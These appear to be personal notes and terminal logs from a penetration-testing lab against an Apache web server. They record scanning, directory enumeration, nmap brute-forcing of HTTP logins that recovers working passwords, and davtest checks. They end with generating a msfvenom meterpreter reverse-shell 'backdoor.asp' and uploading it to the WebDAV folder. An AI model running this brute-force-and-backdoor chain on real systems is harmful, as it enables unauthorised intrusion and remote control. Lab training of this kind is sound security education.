
http-auth-finder.nse
http-auth.nse
http-brute.nse
http-enum.nse
http-waf-detect.nse
http-waf-fingerprint.nse
http-webdav-scan.nse

auxiliary/scanner/http/apache_userdir_enum
auxiliary/scanner/http/brute_dirs
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/http/dir_listing
auxiliary/scanner/http/http_put
auxiliary/scanner/http/files_dir
auxiliary/scanner/http/http_login
auxiliary/scanner/http/http_header
auxiliary/scanner/http/http_version
auxiliary/scanner/http/robots_txt



1. Enumeration web service running, the version, running default scripts, HTTP Headers, WAF
3. Searching if any exploit available using Searchsploit for the version
2. Enumerating Directories and files
4. Bruteforcing to get access for unauthorised directories
3. Enumerating more on any services like webdav if found try exploiting them to get revershell/meterpreter session

root@attackdefense:~# `nmap 192.245.191.3 -p 80 -sV -sC`
root@attackdefense:~# `whatweb 192.245.191.3`
root@attackdefense:~# `wafw00f  http://192.49.74.3/webdav/`
root@attackdefense:~# `searchsploit apache 2.4   `
root@attackdefense:~# `curl http://192.245.191.3/robots.txt/`
root@attackdefense:~# `nmap 192.245.191.3 --script http-enum`
msf5 auxiliary(`scanner/http/dir_scanner`) > 
root@attackdefense:~# `dirb http://192.245.191.3/ -r`
msf5 auxiliary(`scanner/http/files_dir`) > 
root@attackdefense:~# `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/`
root@attackdefense:~# `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/webdav/`
root@attackdefense:~# `curl http://192.245.191.3/secure/ --user "admin:brittany"`
root@attackdefense:~# `curl http://192.245.191.3/webdav/ --user "admin:angels"`
root@attackdefense:~# `davtest -auth admin:angels -url http://192.245.191.3/webdav/`
root@attackdefense:~# `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.49.74.2 LPORT=1234 -f asp > backdoor.asp`
root@attackdefense:~# `curl http://192.49.74.3/webdav/ --user "admin:angels" --upload-file /root/backdoor.asp`
root@attackdefense:~# `cadaver http://192.49.74.3/webdav/`

****************************************************************************************************************************************************************
root@attackdefense:~# `nmap 192.245.191.3 -p 80 -sV -sC`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-02 13:06 UTC
Nmap scan report for target-1 (192.245.191.3)
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/data /secure
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:C0:F5:BF:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds

root@attackdefense:~# `whatweb 192.245.191.3`
http://192.245.191.3 [200 OK] Apache[2.4.18], Country[UNITED STATES][US], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.245.191.3], Title[Apache2 Ubuntu Default Page: It works]
root@attackdefense:~# 

root@attackdefense:~# `wafw00f  http://192.49.74.3/webdav/`

                                 ^     ^
        _   __  _   ____ _   __  _    _   ____
       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
      | V V // o // _/ | V V // 0 // 0 // _/
      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                                <
                                ...'

    WAFW00F - Web Application Firewall Detection Tool

    By Sandro Gauci && Wendel G. Henrique

Checking http://192.49.74.3/webdav/
Generic Detection results:
No WAF detected by the generic detection
Number of requests: 14
root@attackdefense:~# 

root@attackdefense:~# `searchsploit apache 2.4   `
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                                    |  Path
                                                                                                                                                                                                  | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripting                                                                                                                                 | exploits/unix/remote/30835.sh
Apache 2.4.17 - Denial of Service                                                                                                                                                                 | exploits/windows/dos/39037.php
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                                                                                             | exploits/linux/local/46676.php
Apache 2.4.23 mod_http2 - Denial of Service                                                                                                                                                       | exploits/linux/dos/40909.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                                                                                   | exploits/php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                                                                                      | exploits/linux/dos/34133.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                                                  | exploits/linux/webapps/42745.py
Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree                                                                                                                                | exploits/multiple/remote/21492.txt
Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure                                                                                                                                   | exploits/multiple/remote/21490.txt
Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                                                                           | exploits/multiple/remote/21491.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@attackdefense:~# 

root@attackdefense:~# `nmap 192.245.191.3 --script http-enum`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-02 13:07 UTC
Nmap scan report for target-1 (192.245.191.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /webadmin/: Possible admin folder
|   /test.php: Test page
|   /webmail/: Mail folder
|   /robots.txt: Robots file
|   /cgi-bin/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /data/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /doc/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /downloads/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /manual/: Potentially interesting folder
|   /secure/: Potentially interesting folder (401 Unauthorized)
|   /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /users/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /view/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /webadmin/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /webdav/: Potentially interesting folder (401 Unauthorized)
|_  /webdb/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
MAC Address: 02:42:C0:F5:BF:03 (Unknown)

msf5 auxiliary(scanner/http/dir_scanner) > `options`

Module options (auxiliary/scanner/http/dir_scanner):

   Name        Current Setting                                          Required  Description
   ----        ---------------                                          --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
   PATH        /                                                        yes       The path  to identify files
   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                               yes       The target address range or CIDR identifier
   RPORT       80                                                       yes       The target port (TCP)
   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                                        yes       The number of concurrent threads
   VHOST                                                                no        HTTP server virtual host

msf5 auxiliary(scanner/http/dir_scanner) > `set RHOSTS 192.245.191.3`
RHOSTS => 192.245.191.3
msf5 auxiliary(scanner/http/dir_scanner) > `run`

[*] Detecting error code
[*] Using code '404' as not found for 192.245.191.3
[+] Found http://192.245.191.3:80/cgi-bin/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/data/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/doc/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/downloads/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/icons/ 403 (192.245.191.3)
[+] Found http://192.245.191.3:80/manual/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/secure/ 401 (192.245.191.3)
[+] Found http://192.245.191.3:80/users/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/uploads/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/view/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/webadmin/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/web_app/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/webmail/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/webdav/ 401 (192.245.191.3)
[+] Found http://192.245.191.3:80/webdb/ 200 (192.245.191.3)
[+] Found http://192.245.191.3:80/~nobody/ 403 (192.245.191.3)
[+] Found http://192.245.191.3:80/~admin/ 403 (192.245.191.3)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

root@attackdefense:~# `dirb http://192.245.191.3/ -r`

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jan  2 14:26:36 2024
URL_BASE: http://192.245.191.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.245.191.3/ ----
+ http://192.245.191.3/~admin (CODE:403|SIZE:294)                                                                                                                                                                                         
+ http://192.245.191.3/~bin (CODE:403|SIZE:292)                                                                                                                                                                                           
+ http://192.245.191.3/~lp (CODE:403|SIZE:291)                                                                                                                                                                                            
+ http://192.245.191.3/~mail (CODE:403|SIZE:293)                                                                                                                                                                                          
+ http://192.245.191.3/~nobody (CODE:403|SIZE:295)                                                                                                                                                                                        
+ http://192.245.191.3/~sys (CODE:403|SIZE:292)                                                                                                                                                                                           
==> DIRECTORY: http://192.245.191.3/cgi-bin/                                                                                                                                                                                              
+ http://192.245.191.3/cgi-bin/ (CODE:200|SIZE:744)                                                                                                                                                                                       
==> DIRECTORY: http://192.245.191.3/data/                                                                                                                                                                                                 
==> DIRECTORY: http://192.245.191.3/doc/                                                                                                                                                                                                  
==> DIRECTORY: http://192.245.191.3/downloads/                                                                                                                                                                                            
+ http://192.245.191.3/index.html (CODE:200|SIZE:11321)                                                                                                                                                                                   
==> DIRECTORY: http://192.245.191.3/manual/                                                                                                                                                                                               
==> DIRECTORY: http://192.245.191.3/pro/                                                                                                                                                                                                  
+ http://192.245.191.3/robots.txt (CODE:200|SIZE:163)                                                                                                                                                                                     
+ http://192.245.191.3/secure (CODE:401|SIZE:460)                                                                                                                                                                                         
+ http://192.245.191.3/server-status (CODE:403|SIZE:301)                                                                                                                                                                                  
==> DIRECTORY: http://192.245.191.3/uploads/                                                                                                                                                                                              
==> DIRECTORY: http://192.245.191.3/users/                                                                                                                                                                                                
==> DIRECTORY: http://192.245.191.3/view/                                                                                                                                                                                                 
==> DIRECTORY: http://192.245.191.3/webadmin/                                                                                                                                                                                             
+ http://192.245.191.3/webdav (CODE:401|SIZE:460)                                                                                                                                                                                         
==> DIRECTORY: http://192.245.191.3/webdb/                                                                                                                                                                                                
==> DIRECTORY: http://192.245.191.3/webmail/                                                                                                                                                                                              
                                                                                                                                                                                                                                          
-----------------
END_TIME: Tue Jan  2 14:26:46 2024
DOWNLOADED: 4612 - FOUND: 12
root@attackdefense:~# 

msf5 auxiliary(scanner/http/dir_listing) > `use auxiliary/scanner/http/files_dir`
msf5 auxiliary(scanner/http/files_dir) > `set RHOSTS 192.245.191.3`
RHOSTS => 192.245.191.3
msf5 auxiliary(scanner/http/files_dir) > `run`

[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[+] Found http://192.245.191.3:80/file.backup 200
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[+] Found http://192.245.191.3:80/code.c 200
[*] Using code '404' as not found for files with extension .cfg
[+] Found http://192.245.191.3:80/code.cfg 200
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.245.191.3:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[+] Found http://192.245.191.3:80/test.php 200
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension 
[+] Found http://192.245.191.3:80/cgi-bin 301
[+] Found http://192.245.191.3:80/data 301
[+] Found http://192.245.191.3:80/downloads 301
[+] Found http://192.245.191.3:80/doc 301
[+] Found http://192.245.191.3:80/manual 301
[+] Found http://192.245.191.3:80/secure 401
[+] Found http://192.245.191.3:80/users 301
[+] Found http://192.245.191.3:80/uploads 301
[+] Found http://192.245.191.3:80/webadmin 301
[+] Found http://192.245.191.3:80/webdav 401
[+] Found http://192.245.191.3:80/view 301
[+] Found http://192.245.191.3:80/webmail 301
[+] Found http://192.245.191.3:80/~mail 403
[+] Found http://192.245.191.3:80/~bin 403
[+] Found http://192.245.191.3:80/~admin 403
[+] Found http://192.245.191.3:80/~sys 403
[*] Using code '404' as not found for files with extension 
[+] Found http://192.245.191.3:80/cgi-bin 301
[+] Found http://192.245.191.3:80/data 301
[+] Found http://192.245.191.3:80/downloads 301
[+] Found http://192.245.191.3:80/doc 301
[+] Found http://192.245.191.3:80/manual 301
[+] Found http://192.245.191.3:80/secure 401
[+] Found http://192.245.191.3:80/users 301
[+] Found http://192.245.191.3:80/uploads 301
[+] Found http://192.245.191.3:80/webdav 401
[+] Found http://192.245.191.3:80/webadmin 301
[+] Found http://192.245.191.3:80/view 301
[+] Found http://192.245.191.3:80/webmail 301
[+] Found http://192.245.191.3:80/~mail 403
[+] Found http://192.245.191.3:80/~admin 403
[+] Found http://192.245.191.3:80/~bin 403
[+] Found http://192.245.191.3:80/~sys 403
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed



root@attackdefense:~# `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-02 14:50 UTC
Nmap scan report for target-1 (192.245.191.3)
Host is up (0.000036s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-brute: 
|   Accounts: 
|     admin:brittany - Valid credentials
|_  Statistics: Performed 45160 guesses in 32 seconds, average tps: 1433.8
MAC Address: 02:42:C0:F5:BF:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 32.14 seconds
root@attackdefense:~# 

root@attackdefense:~# `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/webdav/`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-02 15:03 UTC
Nmap scan report for target-1 (192.245.191.3)
Host is up (0.000040s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-brute: 
|   Accounts: 
|     admin:angels - Valid credentials
|_  Statistics: Performed 45066 guesses in 32 seconds, average tps: 1406.2
MAC Address: 02:42:C0:F5:BF:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 32.58 seconds

root@attackdefense:~# `curl http://192.245.191.3/secure/ --user "admin:brittany"`
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /secure</title>
 </head>
 <body>
<h1>Index of /secure</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 192.245.191.3 Port 80</address>
</body></html>
root@attackdefense:~# 

root@attackdefense:~# `curl http://192.245.191.3/webdav/ --user "admin:angels"`
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /webdav</title>
 </head>
 <body>
<h1>Index of /webdav</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="passwd.dav">passwd.dav</a></td><td align="right">2019-02-27 04:21  </td><td align="right"> 44 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 192.245.191.3 Port 80</address>
</body></html>

root@attackdefense:~# `davtest -auth admin:angels -url http://192.245.191.3/webdav/`
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.245.191.3/webdav
********************************************************
NOTE    Random string for this session: pK20RLDrlfo
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo
********************************************************
 Sending test files
PUT     jhtml   SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.jhtml
PUT     asp     SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.asp
PUT     cfm     SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.cfm
PUT     php     SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.php
PUT     html    SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.html
PUT     shtml   SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.shtml
PUT     txt     SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.txt
PUT     cgi     SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.cgi
PUT     aspx    SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.aspx
PUT     jsp     SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.jsp
PUT     pl      SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.pl
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    asp     FAIL
EXEC    cfm     FAIL
EXEC    php     FAIL
EXEC    html    SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.html
EXEC    shtml   FAIL
EXEC    txt     SUCCEED:        http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.txt
EXEC    cgi     FAIL
EXEC    aspx    FAIL
EXEC    jsp     FAIL
EXEC    pl      FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.jhtml
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.asp
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.cfm
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.php
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.html
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.shtml
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.txt
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.cgi
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.aspx
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.jsp
PUT File: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.pl
Executes: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.html
Executes: http://192.245.191.3/webdav/DavTestDir_pK20RLDrlfo/davtest_pK20RLDrlfo.txt

root@attackdefense:~# 

root@attackdefense:~# `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.49.74.2 LPORT=1234 -f asp > backdoor.asp`
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of asp file: 38514 bytes
root@attackdefense:~# ls
README  backdoor.asp  tools  wordlists

root@attackdefense:~# `curl http://192.49.74.3/webdav/ --user "admin:angels" --upload-file /root/backdoor.asp`
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/backdoor.asp has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 192.49.74.3 Port 80</address>
</body></html>

root@attackdefense:~# `cadaver http://192.49.74.3/webdav/`
Authentication required for WebDav Authentication on server `192.49.74.3':
Username: `admin`
Password: 
dav:/webdav/> `ls`
Listing collection `/webdav/': succeeded.
        backdoor.asp                       38514  Jan  3 04:45
        passwd.dav                            44  Feb 27  2019
dav:/webdav/> 